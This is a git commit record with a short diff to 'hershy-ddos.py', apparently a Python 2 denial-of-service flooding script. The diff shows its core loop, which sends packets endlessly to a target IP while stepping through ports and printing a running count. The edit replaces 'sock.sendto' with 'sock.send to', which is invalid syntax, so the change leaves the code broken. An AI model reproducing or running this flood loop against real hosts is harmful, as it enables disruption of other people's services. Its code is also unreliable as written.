efdc1b09ca982afafe23ce7f016d102fc3a8cd6e
Kak.scot <66765981+KAKsaro@users.noreply.github.com>
2020-07-01 18:59:32 +0300

    Update hershy-ddos.py
    By kak.saro

--- hershy-ddos.py
+++ hershy-ddos.py
@@ -41,7 +41,7 @@ print "[====================] 100%"
 time.sleep(3)
 sent = 0
 while True:
-     sock.sendto(bytes, (ip,port))
+     sock.send to(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
      print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
